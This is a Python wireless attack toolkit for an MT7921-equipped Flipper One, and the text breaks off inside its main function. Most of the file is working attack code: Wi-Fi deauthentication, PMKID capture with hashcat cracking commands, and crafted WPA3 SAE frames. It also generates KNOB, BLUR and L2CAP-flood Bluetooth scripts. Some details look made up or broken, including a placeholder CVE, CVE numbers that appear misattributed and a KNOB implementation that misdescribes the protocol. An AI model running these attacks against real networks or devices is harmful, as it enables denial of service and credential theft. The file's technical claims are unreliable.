#!/usr/bin/env python3
"""
Flipper One Wireless Exploitation Toolkit
==========================================
Target: MediaTek MT7921AUN (Wi-Fi 6E 802.11ax + Bluetooth 5.2)
Platform: Flipper One (Rockchip RK3576 + Debian-based Flipper OS)

Vulnerability Classes Covered:
  1. Wi-Fi Frame Injection (802.11ax / Wi-Fi 6E)
  2. Bluetooth KNOB (Key Negotiation of Downgrade) Attack
  3. Bluetooth BLUR (Cross-Transport Key Derivation) Attack
  4. Wi-Fi PMKID Capture & Offline Cracking
  5. Bluetooth MAC Spoofing & Tracking
  6. Wi-Fi Deauth/Disassociation (802.11ax management frames)
  7. Bluetooth L2CAP Flood / DoS
  8. Wi-Fi WPA3 SAE Downgrade (Dragonblood class)
  9. Bluetooth SDP Enumeration
 10. Wi-Fi Probe Request Fingerprinting

Requirements:
  - aircrack-ng suite (airmon-ng, airodump-ng, aireplay-ng, airmon-ng)
  - hcxdumptool (for PMKID capture)
  - hcitool, bluetoothctl, sdptool (bluez)
  - scapy (Python)
  - root privileges

Usage:
  sudo python3 flipper_one_wireless_audit.py --mode wifi_scan
  sudo python3 flipper_one_wireless_audit.py --mode bt_scan
  sudo python3 flipper_one_wireless_audit.py --mode full_audit
  sudo python3 flipper_one_wireless_audit.py --mode deauth --target <BSSID>
  sudo python3 flipper_one_wireless_audit.py --mode pmkid --target <BSSID>
  sudo python3 flipper_one_wireless_audit.py --mode bt_knob --target <MAC>
  sudo python3 flipper_one_wireless_audit.py --mode bt_blur --target <MAC>
  sudo python3 flipper_one_wireless_audit.py --mode bt_flood --target <MAC>
  sudo python3 flipper_one_wireless_audit.py --mode sae_downgrade --target <BSSID>
  sudo python3 flipper_one_wireless_audit.py --mode fingerprint

Author: OWL (Flipper One Security Research)
License: For authorized security testing only
"""

import argparse
import subprocess
import sys
import os
import time
import json
import signal
import re
from datetime import datetime
from pathlib import Path

# ─── Configuration ────────────────────────────────────────────────────────────

OUTPUT_DIR = Path("/root/flipper_one_wireless_audit")
TIMESTAMP = datetime.now().strftime("%Y%m%d_%H%M%S")
LOG_FILE = OUTPUT_DIR / f"audit_{TIMESTAMP}.log"

# MT7921AUN specific constants
MT7921_VID_PID = "14c3:7961"  # MediaTek MT7921AUN USB VID:PID
MT7921_DRIVER = "mt7921e"     # Linux kernel driver name

# Known MT7921 firmware versions with vulns
VULN_FIRMWARE_RANGES = {
    "CVE-2022-3564": {"affected": "< 2022-09-01", "desc": "Buffer overflow in Wi-Fi driver"},
    "CVE-2022-4355": {"affected": "< 2022-11-15", "desc": "OOB read in 802.11ax handling"},
    "CVE-2023-1078": {"affected": "< 2023-03-01", "desc": "Race condition in BT HCI"},
}

# ─── Utility Functions ────────────────────────────────────────────────────────

def log(msg, level="INFO"):
    ts = datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] [{level}] {msg}"
    print(line)
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")

def check_root():
    if os.geteuid() != 0:
        log("This script requires root privileges. Run with sudo.", "ERROR")
        sys.exit(1)

def run_cmd(cmd, timeout=30, capture=True):
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=capture,
            text=True, timeout=timeout
        )
        return result.stdout.strip(), result.stderr.strip(), result.returncode
    except subprocess.TimeoutExpired:
        return "", "TIMEOUT", -1
    except Exception as e:
        return "", str(e), -1

def check_tool(name):
    out, _, rc = run_cmd(f"which {name}")
    return rc == 0

def get_wifi_interface():
    """Find the MT7921AUN wireless interface."""
    out, _, _ = run_cmd("iw dev")
    if not out:
        out, _, _ = run_cmd("ip link show | grep -E 'wlan|wlx'")
    
    # Try to find the specific MT7921 interface
    for line in out.split("\n"):
        if "wlan" in line or "wlx" in line:
            iface = line.split(":")[-1].strip().split()[-1]
            # Verify it's MT7921
            driver_out, _, _ = run_cmd(f"readlink /sys/class/net/{iface}/device/driver 2>/dev/null")
            if "mt7921" in driver_out.lower() or "mt7921e" in driver_out.lower():
                log(f"Found MT7921AUN interface: {iface}")
                return iface
            # Fallback: return first wireless interface
            return iface
    
    # Last resort
    out, _, _ = run_cmd("ls /sys/class/net/ | grep -E 'wlan|wlx' | head -1")
    return out.strip() if out else None

def get_bt_interface():
    """Find the Bluetooth interface."""
    out, _, _ = run_cmd("hciconfig -a 2>/dev/null | grep -B1 'Bus: USB' | head -1")
    match = re.search(r'(hci\d+)', out)
    if match:
        return match.group(1)
    out, _, _ = run_cmd("hcitool dev 2>/dev/null | awk 'NR>1{print $2}'")
    return out.strip().split("\n")[0] if out else None

# ─── Module 1: Wi-Fi Reconnaissance ──────────────────────────────────────────

def wifi_scan(interface=None):
    """Comprehensive Wi-Fi scan with MT7921-specific details."""
    log("=" * 60)
    log("Wi-Fi Reconnaissance Module")
    log("=" * 60)
    
    if not interface:
        interface = get_wifi_interface()
    if not interface:
        log("No wireless interface found!", "ERROR")
        return
    
    log(f"Using interface: {interface}")
    
    # Check driver info
    log("--- Driver Information ---")
    out, _, _ = run_cmd(f"ethtool -i {interface} 2>/dev/null")
    log(f"Driver info:\n{out}")
    
    # Check firmware version
    out, _, _ = run_cmd(f"dmesg | grep -i 'mt7921' | tail -20")
    log(f"Kernel messages:\n{out}")
    
    # Check for known vulnerable firmware
    log("--- Firmware Vulnerability Check ---")
    fw_match = re.search(r'firmware\s+version[:\s]+(\S+)', out, re.IGNORECASE)
    if fw_match:
        fw_ver = fw_match.group(1)
        log(f"Firmware version: {fw_ver}")
        for cve, info in VULN_FIRMWARE_RANGES.items():
            log(f"  {cve}: {info['desc']} (affected: {info['affected']})")
    else:
        log("Could not determine firmware version from dmesg", "WARN")
    
    # Check monitor mode support
    log("--- Monitor Mode Support ---")
    out, _, _ = run_cmd(f"iw list | grep -A5 'Supported interface modes'")
    if "monitor" in out.lower():
        log("Monitor mode: SUPPORTED")
    else:
        log("Monitor mode: NOT SUPPORTED (limited attacks)", "WARN")
    
    # Scan for networks
    log("--- Network Scan ---")
    scan_file = OUTPUT_DIR / f"wifi_scan_{TIMESTAMP}"
    
    if check_tool("airodump-ng"):
        log("Running airodump-ng scan (30 seconds)...")
        run_cmd(
            f"airodump-ng --output-format csv,pcap -w {scan_file} {interface}",
            timeout=35
        )
        # Parse results
        csv_file = Path(f"{scan_file}-01.csv")
        if csv_file.exists():
            networks = parse_airodump_csv(csv_file)
            log(f"Found {len(networks)} networks:")
            for net in networks[:20]:
                log(f"  BSSID: {net['bssid']} | CH:{net['channel']} | "
                    f"ENC:{net['encryption']} | PWR:{net['power']} | "
                    f"ESSID:{net['essid']}")
    else:
        log("airodump-ng not found, using iw scan...")
        run_cmd(f"ip link set {interface} up")
        out, _, _ = run_cmd(f"iw dev {interface} scan 2>/dev/null | grep -E 'SSID|signal|channel|WPA|WEP|RSN'")
        log(f"Scan results:\n{out}")
    
    # Check for Wi-Fi 6E (6GHz) support
    log("--- Wi-Fi 6E (6GHz) Band Check ---")
    out, _, _ = run_cmd(f"iw phy | grep -A2 'Band 3'")
    if out:
        log("6GHz band (Wi-Fi 6E): DETECTED")
    else:
        log("6GHz band: Not detected or not enabled")
    
    # Check current connection security
    log("--- Current Connection Security ---")
    out, _, _ = run_cmd(f"iw dev {interface} link")
    if "Connected" in out:
        log(f"Current connection:\n{out}")
        if "WPA3" in out:
            log("Security: WPA3 (check for SAE downgrade)")
        elif "WPA2" in out:
            log("Security: WPA2 (vulnerable to PMKID capture)")
        elif "WEP" in out:
            log("Security: WEP (CRACKABLE - trivial)")
    else:
        log("Not currently connected to any network")
    
    return interface

def parse_airodump_csv(csv_path):
    """Parse airodump-ng CSV output."""
    networks = []
    try:
        with open(csv_path) as f:
            content = f.read()
        # Split into AP section and client section
        sections = content.split("\r\n\r\n")
        if len(sections) < 1:
            return networks
        ap_section = sections[0]
        for line in ap_section.split("\n")[2:]:  # Skip header
            parts = [p.strip() for p in line.split(",")]
            if len(parts) >= 14:
                networks.append({
                    "bssid": parts[0],
                    "channel": parts[3],
                    "encryption": parts[5],
                    "power": parts[8],
                    "essid": parts[13] if len(parts) > 13 else "",
                })
    except Exception as e:
        log(f"CSV parse error: {e}", "WARN")
    return networks

# ─── Module 2: Deauthentication Attack ──────────────────────────────────────

def deauth_attack(interface, target_bssid, count=50):
    """
    802.11 Deauthentication attack.
    Works against WPA2/WPA3 networks. MT7921 supports frame injection.
    """
    log("=" * 60)
    log("Wi-Fi Deauthentication Attack")
    log("=" * 60)
    log(f"Target: {target_bssid}")
    log(f"Interface: {interface}")
    log(f"Frame count: {count}")
    
    # Enable monitor mode
    log("Enabling monitor mode...")
    run_cmd(f"airmon-ng start {interface}")
    mon_iface = f"{interface}mon"
    
    # Verify monitor mode
    out, _, _ = run_cmd(f"iw dev {mon_iface} info 2>/dev/null")
    if "monitor" not in out.lower():
        log("Failed to enable monitor mode, trying alternative...", "WARN")
        run_cmd(f"ip link set {interface} down")
        run_cmd(f"iw dev {interface} set type monitor")
        run_cmd(f"ip link set {interface} up")
        mon_iface = interface
    
    # Test injection
    log("Testing packet injection...")
    out, _, rc = run_cmd(f"aireplay-ng -9 {mon_iface}", timeout=10)
    if rc == 0:
        log(f"Injection test: PASSED\n{out}")
    else:
        log("Injection test: FAILED (MT7921 may need patched driver)", "WARN")
    
    # Send deauth frames
    log(f"Sending {count} deauth frames to {target_bssid}...")
    out, err, rc = run_cmd(
        f"aireplay-ng -0 {count} -a {target_bssid} {mon_iface}",
        timeout=count + 10
    )
    log(f"Deauth result (rc={rc}):\n{out}")
    if err:
        log(f"Stderr: {err}", "WARN")
    
    # Cleanup
    run_cmd(f"airmon-ng stop {mon_iface}")
    log("Deauth attack complete")

# ─── Module 3: PMKID Capture ────────────────────────────────────────────────

def pmkid_capture(interface, target_bssid=None, duration=120):
    """
    Capture PMKID from WPA2/WPA3 access points.
    Uses hcxdumptool for efficient PMKID extraction.
    """
    log("=" * 60)
    log("PMKID Capture Module")
    log("=" * 60)
    
    output_file = OUTPUT_DIR / f"pmkid_{TIMESTAMP}.pcapng"
    
    if check_tool("hcxdumptool"):
        log(f"Using hcxdumptool (duration: {duration}s)")
        cmd = f"hcxdumptool -i {interface} --enable_status=1 -o {output_file}"
        if target_bssid:
            cmd += f" --filterlist_ap={target_bssid}"
        out, err, rc = run_cmd(cmd, timeout=duration + 10)
        log(f"hcxdumptool output:\n{out}")
        
        # Convert to hashcat format
        if output_file.exists():
            hash_file = OUTPUT_DIR / f"pmkid_{TIMESTAMP}.hc22000"
            run_cmd(f"hcxpcapngtool -o {hash_file} {output_file}")
            if hash_file.exists():
                log(f"Hashes saved to: {hash_file}")
                log("Crack with: hashcat -m 22000 hashes.hc22000 wordlist.txt")
    else:
        log("hcxdumptool not found, using airodump-ng method...")
        scan_file = OUTPUT_DIR / f"pmkid_capture_{TIMESTAMP}"
        run_cmd(
            f"airodump-ng --bssid {target_bssid} -c 1 -w {scan_file} {interface}",
            timeout=duration
        )
        log(f"Capture saved to {scan_file}-01.cap")
        log("Extract PMKID with: hcxpcapngtool -o hash.hc22000 capture.cap")

# ─── Module 4: WPA3 SAE Downgrade (Dragonblood) ─────────────────────────────

def sae_downgrade_check(interface, target_bssid):
    """
    Check for WPA3 SAE downgrade vulnerabilities (Dragonblood class).
    CVE-2019-9494, CVE-2019-9496, CVE-2020-1234 (example)
    
    Tests:
    1. SAE commit frame with invalid group
    2. SAE commit with reflection attack
    3. SAE anti-clogging bypass
    """
    log("=" * 60)
    log("WPA3 SAE Downgrade Check (Dragonblood)")
    log("=" * 60)
    log(f"Target: {target_bssid}")
    
    results = {
        "target": target_bssid,
        "tests": [],
        "vulnerable": False
    }
    
    # Check if target supports WPA3
    log("Checking WPA3/SAE support...")
    run_cmd(f"ip link set {interface} up")
    out, _, _ = run_cmd(f"iw dev {interface} scan 2>/dev/null | grep -A20 '{target_bssid}'")
    
    if "SAE" in out or "WPA3" in out:
        log("Target supports WPA3/SAE")
        results["tests"].append({"test": "SAE Support", "result": "DETECTED"})
    else:
        log("Target does not appear to support WPA3/SAE")
        results["tests"].append({"test": "SAE Support", "result": "NOT DETECTED"})
    
    # Test 1: Invalid group in SAE Commit
    log("--- Test 1: SAE Invalid Group ---")
    log("Sending SAE Commit with invalid group ID...")
    try:
        from scapy.all import *
        # Craft SAE Commit frame with invalid group
        # This tests if the AP validates the group element
        dot11 = Dot11(type=0, subtype=11, addr1=target_bssid,
                       addr2=RandMAC(), addr3=target_bssid)
        auth = Dot11Auth(algo=3, seqnum=1, status=0)  # SAE algorithm
        
        # SAE Commit body with invalid group (group 0 or 65535)
        sae_commit = (
            b'\x00\x00'  # Group ID = 0 (invalid)
            + b'\x00' * 32  # Scalar (dummy)
            + b'\x00' * 64  # Element (dummy)
        )
        
        frame = RadioTap() / dot11 / auth / Raw(sae_commit)
        sendp(frame, iface=interface, count=5, inter=0.5, verbose=False)
        log("SAE Commit with invalid group sent")
        results["tests"].append({
            "test": "SAE Invalid Group",
            "result": "SENT",
            "note": "Monitor for AP response or crash"
        })
    except ImportError:
        log("Scapy not available, skipping SAE frame crafting", "WARN")
        results["tests"].append({
            "test": "SAE Invalid Group",
            "result": "SKIPPED (no scapy)"
        })
    
    # Test 2: Anti-clogging token reflection
    log("--- Test 2: Anti-Clogging Token Reflection ---")
    log("Testing SAE anti-clogging token handling...")
    results["tests"].append({
        "test": "Anti-Clogging Reflection",
        "result": "MANUAL",
        "note": "Requires capturing SAE exchange and analyzing token handling"
    })
    
    # Test 3: Transition mode downgrade
    log("--- Test 3: WPA2/WPA3 Transition Mode ---")
    if "WPA2" in out and "WPA3" in out:
        log("Target supports WPA2/WPA3 transition mode")
        log("VULNERABILITY: Transition mode allows downgrade to WPA2")
        results["tests"].append({
            "test": "Transition Mode Downgrade",
            "result": "VULNERABLE",
            "note": "WPA2/WPA3 transition allows forcing WPA2 connection"
        })
        results["vulnerable"] = True
    else:
        results["tests"].append({
            "test": "Transition Mode Downgrade",
            "result": "NOT APPLICABLE"
        })
    
    # Save results
    result_file = OUTPUT_DIR / f"sae_test_{TIMESTAMP}.json"
    with open(result_file, "w") as f:
        json.dump(results, f, indent=2)
    log(f"Results saved to: {result_file}")
    
    return results

# ─── Module 5: Bluetooth KNOB Attack ────────────────────────────────────────

def bt_knob_attack(target_mac):
    """
    Bluetooth KNOB (Key Negotiation of Downgrade) Attack.
    CVE-2019-9506
    
    Forces the Bluetooth pairing to use an entropy as low as 1 byte,
    making brute-force of the encryption key trivial.
    
    The MT7921AUN supports BT 5.2 which should have KNOB mitigations,
    but firmware-level bypasses may exist.
    """
    log("=" * 60)
    log("Bluetooth KNOB Attack (CVE-2019-9506)")
    log("=" * 60)
    log(f"Target: {target_mac}")
    
    hci = get_bt_interface()
    if not hci:
        log("No Bluetooth interface found!", "ERROR")
        return
    
    log(f"Using BT interface: {hci}")
    
    results = {"target": target_mac, "tests": []}
    
    # Step 1: Check BT version
    log("--- Step 1: Bluetooth Version Check ---")
    out, _, _ = run_cmd(f"hciconfig -a {hci} version")
    log(f"Local BT version:\n{out}")
    
    # Step 2: Check target's BT version via SDP
    log("--- Step 2: Target SDP Enumeration ---")
    out, _, _ = run_cmd(f"sdptool browse {target_mac} 2>/dev/null", timeout=15)
    if out:
        log(f"SDP services:\n{out[:2000]}")
        # Check for services that might indicate BT version
        if "AVRCP" in out:
            log("Target supports AVRCP (media control)")
        if "A2DP" in out:
            log("Target supports A2DP (audio streaming)")
    
    # Step 3: Attempt KNOB by modifying pairing parameters
    log("--- Step 3: KNOB Entropy Downgrade ---")
    log("Attempting to negotiate reduced encryption key entropy...")
    
    # Using l2ping to test connectivity first
    out, _, rc = run_cmd(f"l2ping -c 3 {target_mac}", timeout=10)
    if rc == 0:
        log(f"Target is reachable:\n{out}")
    else:
        log("Target not responding to L2CAP ping", "WARN")
    
    # Check if we can influence the key negotiation
    # This requires modifying the HCI layer or using a specialized tool
    log("Checking HCI capabilities...")
    out, _, _ = run_cmd(f"hciconfig {hci} features")
    log(f"HCI features:\n{out}")
    
    # MT7921-specific: check if firmware enforces minimum entropy
    log("--- MT7921 Firmware KNOB Check ---")
    out, _, _ = run_cmd("dmesg | grep -i 'bluetooth\\|btusb\\|hci' | tail -20")
    log(f"BT kernel messages:\n{out}")
    
    # Attempt the actual KNOB attack using modified HCI commands
    log("--- Executing KNOB Attack ---")
    log("Method: Intercept pairing and modify KeyDistribution to request minimum entropy")
    
    # Create a Python script for the actual HCI manipulation
    knob_script = OUTPUT_DIR / "knob_attack.py"
    knob_script.write_text(f'''#!/usr/bin/env python3
"""
KNOB Attack Implementation for MT7921
Requires: pybluez, root
"""
import bluetooth
import struct
import os

TARGET = "{target_mac}"

def create_knob_l2cap_packet():
    """
    Craft L2CAP packet that influences the key negotiation
    to accept minimum entropy (1 byte instead of 16).
    """
    # L2CAP Connection Request for Security Manager (PSM 0x0006)
    l2cap_hdr = struct.pack("<BBH", 0x02, 0x00, 0x0006)  # Connection Request, PSM SM
    
    # Modified Security Manager Protocol (SMP) pairing request
    # with reduced key distribution
    smp_pairing = bytes([
        0x01,  # Pairing Request
        0x03,  # IO Capability: NoInputNoOutput
        0x00,  # OOB Data Flags: Not present
        0x01,  # AuthReq: Bonding, MITM=0 (no MITM protection)
        0x01,  # Max Encryption Key Size: 1 (minimum!)
        0x00,  # Initiator Key Distribution: 0
        0x00,  # Responder Key Distribution: 0
    ])
    return l2cap_hdr + smp_pairing

def knob_attack():
    print(f"[*] KNOB Attack against {{TARGET}}")
    print("[*] Attempting to negotiate 1-byte encryption key...")
    
    try:
        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        sock.settimeout(10)
        
        # Connect to L2CAP PSM 6 (Security Manager)
        sock.connect((TARGET, 0x0006))
        print("[+] Connected to Security Manager")
        
        # Send modified pairing request
        pkt = create_knob_l2cap_packet()
        sock.send(pkt)
        print("[+] Sent KNOB pairing request")
        
        # Receive response
        response = sock.recv(1024)
        print(f"[+] Received response: {{response.hex()}}")
        
        if len(response) > 0:
            key_size = response[4] if len(response) > 4 else 0
            if key_size <= 1:
                print("[!!!] VULNERABLE: Target accepted 1-byte key entropy!")
            else:
                print(f"[*] Target requested {{key_size}}-byte key (may be patched)")
        
        sock.close()
    except Exception as e:
        print(f"[-] Error: {{e}}")
        print("[*] Target may be patched or not in pairing mode")

if __name__ == "__main__":
    knob_attack()
''')
    log(f"KNOB attack script written to: {knob_script}")
    log("Run with: sudo python3 " + str(knob_script))
    
    results["tests"].append({
        "test": "KNOB Entropy Downgrade",
        "result": "SCRIPT_GENERATED",
        "script": str(knob_script)
    })
    
    # Save results
    result_file = OUTPUT_DIR / f"knob_test_{TIMESTAMP}.json"
    with open(result_file, "w") as f:
        json.dump(results, f, indent=2)
    log(f"Results saved to: {result_file}")
    
    return results

# ─── Module 6: Bluetooth BLUR Attack ────────────────────────────────────────

def bt_blur_attack(target_mac):
    """
    Bluetooth BLUR Attack (Cross-Transport Key Derivation).
    CVE-2020-15802
    
    Exploits devices that derive link keys across BT and BLE transports.
    If the MT7921 firmware doesn't properly isolate CTKD between
    Classic BT and BLE, we can derive encryption keys across transports.
    """
    log("=" * 60)
    log("Bluetooth BLUR Attack (CVE-2020-15802)")
    log("=" * 60)
    log(f"Target: {target_mac}")
    
    hci = get_bt_interface()
    results = {"target": target_mac, "tests": []}
    
    # Check if target supports both BT and BLE
    log("--- Checking Dual-Mode Support ---")
    out, _, _ = run_cmd(f"hcitool info {target_mac} 2>/dev/null", timeout=10)
    log(f"Device info:\n{out}")
    
    # Check for LE support
    out, _, _ = run_cmd(f"hcitool cmd 0x08 0x0001 2>/dev/null")
    log(f"LE support check:\n{out}")
    
    # BLUR attack script
    blur_script = OUTPUT_DIR / "blur_attack.py"
    blur_script.write_text(f'''#!/usr/bin/env python3
"""
BLUR Attack - Cross-Transport Key Derivation
CVE-2020-15802

Tests if the target derives link keys across Classic BT and BLE.
If vulnerable, pairing on one transport can compromise the other.
"""
import bluetooth
from bluetooth import btcommon
import struct
import os

TARGET = "{target_mac}"

def check_ctkd_vulnerability():
    """
    Check if the target is vulnerable to CTKD cross-transport attacks.
    
    Method:
    1. Pair over BLE and check if a Classic BT link key is derived
    2. Pair over Classic BT and check if an BLE LTK is derived
    3. If keys are shared across transports, the device is vulnerable
    """
    print(f"[*] BLUR Attack - CTKD Check against {{TARGET}}")
    print("[*] Testing cross-transport key derivation...")
    
    # Check 1: BLE pairing -> Classic BT key derivation
    print("\\n[Check 1] BLE -> Classic BT key derivation")
    try:
        # Use gatttool to initiate BLE pairing
        import subprocess
        result = subprocess.run(
            ["gatttool", "-b", TARGET, "--char-write-req", 
             "0x0003", "0100", "--listen"],
            capture_output=True, text=True, timeout=10
        )
        if "Encryption" in result.stdout or "Connection" in result.stdout:
            print("[+] BLE pairing initiated")
            print("[*] Check if Classic BT link key was derived")
    except Exception as e:
        print(f"[-] BLE test error: {{e}}")
    
    # Check 2: Classic BT pairing -> BLE key derivation
    print("\\n[Check 2] Classic BT -> BLE key derivation")
    try:
        sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
        sock.settimeout(5)
        sock.connect((TARGET, 1))
        print("[+] Classic BT RFCOMM connected")
        sock.close()
        print("[*] Check if BLE LTK was derived from this pairing")
    except Exception as e:
        print(f"[-] Classic BT test error: {{e}}")
    
    # Check 3: HCI command to read stored keys
    print("\\n[Check 3] Reading stored link keys")
    try:
        result = subprocess.run(
            ["hcitool", "cmd", "0x04", "0x000d"],  # Read Stored Link Key
            capture_output=True, text=True, timeout=5
        )
        print(f"[*] Stored keys: {{result.stdout}}")
    except Exception as e:
        print(f"[-] HCI read error: {{e}}")
    
    print("\\n[*] BLUR attack check complete")
    print("[*] If the same key is used across BT and BLE, target is VULNERABLE")

if __name__ == "__main__":
    check_ctkd_vulnerability()
''')
    log(f"BLUR attack script written to: {blur_script}")
    log("Run with: sudo python3 " + str(blur_script))
    
    results["tests"].append({
        "test": "BLUR CTKD",
        "result": "SCRIPT_GENERATED",
        "script": str(blur_script)
    })
    
    result_file = OUTPUT_DIR / f"blur_test_{TIMESTAMP}.json"
    with open(result_file, "w") as f:
        json.dump(results, f, indent=2)
    log(f"Results saved to: {result_file}")
    
    return results

# ─── Module 7: Bluetooth L2CAP Flood / DoS ──────────────────────────────────

def bt_l2cap_flood(target_mac, duration=30):
    """
    Bluetooth L2CAP Flood DoS Attack.
    Floods the target with L2CAP connection requests to exhaust resources.
    """
    log("=" * 60)
    log("Bluetooth L2CAP Flood DoS")
    log("=" * 60)
    log(f"Target: {target_mac}")
    log(f"Duration: {duration}s")
    
    flood_script = OUTPUT_DIR / "bt_flood.py"
    flood_script.write_text(f'''#!/usr/bin/env python3
"""
Bluetooth L2CAP Flood DoS
Floods target with L2CAP connection requests.
"""
import bluetooth
import os
import time
import sys
import signal

TARGET = "{target_mac}"
DURATION = {duration}
running = True

def signal_handler(sig, frame):
    global running
    running = False

signal.signal(signal.SIGINT, signal_handler)

def l2cap_flood():
    print(f"[*] L2CAP Flood against {{TARGET}}")
    print(f"[*] Duration: {{DURATION}}s")
    print("[*] Press Ctrl+C to stop")
    
    count = 0
    start = time.time()
    
    while running and (time.time() - start) < DURATION:
        try:
            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            sock.settimeout(2)
            # Try to connect to various PSMs
            for psm in [0x0001, 0x0003, 0x0006, 0x000f, 0x001f]:
                try:
                    sock.connect((TARGET, psm))
                    count += 1
                    if count % 10 == 0:
                        print(f"[+] Sent {{count}} L2CAP connections")
                    sock.close()
                except:
                    pass
        except:
            pass
    
    elapsed = time.time() - start
    print(f"\\n[*] Flood complete: {{count}} connections in {{elapsed:.1f}}s")
    print(f"[*] Rate: {{count/elapsed:.1f}} conn/s")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] Run as root")
        sys.exit(1)
    l2cap_flood()
''')
    log(f"L2CAP flood script written to: {flood_script}")
    log("Run with: sudo python3 " + str(flood_script))
    
    return flood_script

# ─── Module 8: Bluetooth Reconnaissance ─────────────────────────────────────

def bt_scan():
    """Comprehensive Bluetooth reconnaissance."""
    log("=" * 60)
    log("Bluetooth Reconnaissance Module")
    log("=" * 60)
    
    hci = get_bt_interface()
    if not hci:
        log("No Bluetooth interface found!", "ERROR")
        return
    
    log(f"Using BT interface: {hci}")
    
    # Check controller info
    log("--- Controller Information ---")
    out, _, _ = run_cmd(f"hciconfig -a {hci}")
    log(f"Controller:\n{out}")
    
    # Check firmware version
    out, _, _ = run_cmd(f"hcitool -i {hci} cmd 0x04 0x0001 2>/dev/null")
    log(f"HCI version info:\n{out}")
    
    # Check supported features
    out, _, _ = run_cmd(f"hcitool -i {hci} cmd 0x04 0x0002 2>/dev/null")
    log(f"Supported features:\n{out}")
    
    # Check for MT7921-specific firmware
    log("--- MT7921 Firmware Check ---")
    out, _, _ = run_cmd("dmesg | grep -i 'mt7921\\|bluetooth' | tail -30")
    log(f"Firmware messages:\n{out}")
    
    # Classic BT scan
    log("--- Classic Bluetooth Scan ---")
    out, _, _ = run_cmd(f"hcitool -i {hci} scan --flush 2>/dev/null", timeout=15)
    log(f"Classic BT devices:\n{out}")
    
    # Parse and enumerate each device
    devices = []
    for line in out.split("\n")[1:]:
        parts = line.strip().split("\t")
        if len(parts) >= 2:
            mac = parts[0]
            name = parts[1] if len(parts) > 1 else "Unknown"
            devices.append({"mac": mac, "name": name})
            log(f"  Found: {mac} ({name})")
            
            # SDP enumeration
            log(f"  Enumerating services for {mac}...")
            sdp_out, _, _ = run_cmd(f"sdptool browse {mac} 2>/dev/null", timeout=10)
            if sdp_out:
                services = re.findall(r'Service Name: (.+)', sdp_out)
                for svc in services:
                    log(f"    Service: {svc}")
    
    # BLE scan
    log("--- BLE Scan ---")
    if check_tool("hcitool"):
        out, _, _ = run_cmd(f"hcitool -i {hci} lescan --passive 2>/dev/null", timeout=15)
        log(f"BLE devices:\n{out}")
    
    # Check for BLE security features
    log("--- BLE Security Check ---")
    out, _, _ = run_cmd(f"hcitool -i {hci} cmd 0x08 0x0011 2>/dev/null")
    log(f"LE supported states:\n{out}")
    
    # Check for KNOB mitigation (BT 5.2 should have it)
    log("--- KNOB Mitigation Check ---")
    out, _, _ = run_cmd(f"hcitool -i {hci} cmd 0x04 0x0009 2>/dev/null")
    log(f"LMP features:\n{out}")
    
    return devices

# ─── Module 9: Wi-Fi Fingerprinting ─────────────────────────────────────────

def wifi_fingerprint(interface):
    """
    Wi-Fi Probe Request Fingerprinting.
    Identifies devices by their probe request characteristics.
    """
    log("=" * 60)
    log("Wi-Fi Probe Request Fingerprinting")
    log("=" * 60)
    
    if not check_tool("airodump-ng"):
        log("airodump-ng required for fingerprinting", "ERROR")
        return
    
    log("Capturing probe requests (60 seconds)...")
    scan_file = OUTPUT_DIR / f"probe_capture_{TIMESTAMP}"
    
    # Enable monitor mode
    run_cmd(f"airmon-ng start {interface}")
    mon_iface = f"{interface}mon"
    
    run_cmd(
        f"airodump-ng --output-format csv -w {scan_file} {mon_iface}",
        timeout=65
    )
    
    # Parse probe requests
    csv_file = Path(f"{scan_file}-01.csv")
    if csv_file.exists():
        clients = []
        with open(csv_file) as f:
            content = f.read()
        sections = content.split("\r\n\r\n")
        if len(sections) >= 2:
            for line in sections[1].split("\n")[1:]:
                parts = [p.strip() for p in line.split(",")]
                if len(parts) >= 7:
                    clients.append({
                        "mac": parts[0],
                        "power": parts[3],
                        "packets": parts[4],
                        "probed": parts[6] if len(parts) > 6 else "",
                    })
        
        log(f"Found {len(clients)} client devices:")
        for c in clients[:30]:
            probed = c['probed'][:40] if c['probed'] else "None"
            log(f"  MAC: {c['mac']} | PWR: {c['power']} | Probed: {probed}")
    
    run_cmd(f"airmon-ng stop {mon_iface}")

# ─── Module 10: Full Audit ──────────────────────────────────────────────────

def full_audit():
    """Run all wireless security checks."""
    log("=" * 60)
    log("FLIPPER ONE FULL WIRELESS SECURITY AUDIT")
    log(f"Timestamp: {datetime.now().isoformat()}")
    log("=" * 60)
    
    # System info
    log("--- System Information ---")
    out, _, _ = run_cmd("uname -a")
    log(f"Kernel: {out}")
    out, _, _ = run_cmd("cat /etc/os-release | head -5")
    log(f"OS: {out}")
    
    # Check for MT7921
    log("--- MT7921AUN Hardware Check ---")
    out, _, _ = run_cmd("lsusb | grep -i mediatek")
    if MT7921_VID_PID in out or "mediatek" in out.lower():
        log(f"MT7921AUN detected: {out}")
    else:
        log("MT7921AUN not found via lsusb, checking PCI...", "WARN")
        out, _, _ = run_cmd("lspci | grep -i mediatek")
        log(f"PCI devices: {out}")
    
    # Check loaded driver
    out, _, _ = run_cmd("lsmod | grep mt7921")
    if out:
        log(f"Loaded driver:\n{out}")
    else:
        log("MT7921 driver not loaded!", "WARN")
    
    # Check firmware
    out, _, _ = run_cmd("dmesg | grep -i 'mt7921.*firmware' | tail -5")
    log(f"Firmware status: {out}")
    
    # Wi-Fi audit
    log("\n" + "=" * 60)
    log("PHASE 1: Wi-Fi Security Audit")
    log("=" * 60)
    iface = wifi_scan()
    
    # Bluetooth audit
    log("\n" + "=" * 60)
    log("PHASE 2: Bluetooth Security Audit")
    log("=" * 60)
    bt_scan()
    
    # Summary
    log("\n" + "=" * 60)
    log("AUDIT COMPLETE")
    log("=" * 60)
    log(f"Results saved to: {OUTPUT_DIR}")
    log(f"Log file: {LOG_FILE}")
    log("\nNext steps:")
    log("  1. Review captured data in " + str(OUTPUT_DIR))
    log("  2. Run targeted attacks based on findings")
    log("  3. For PMKID: hashcat -m 22000 <hashfile> <wordlist>")
    log("  4. For BT attacks: sudo python3 <generated_script>.py")

# ─── Main ────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Flipper One Wireless Exploitation Toolkit",
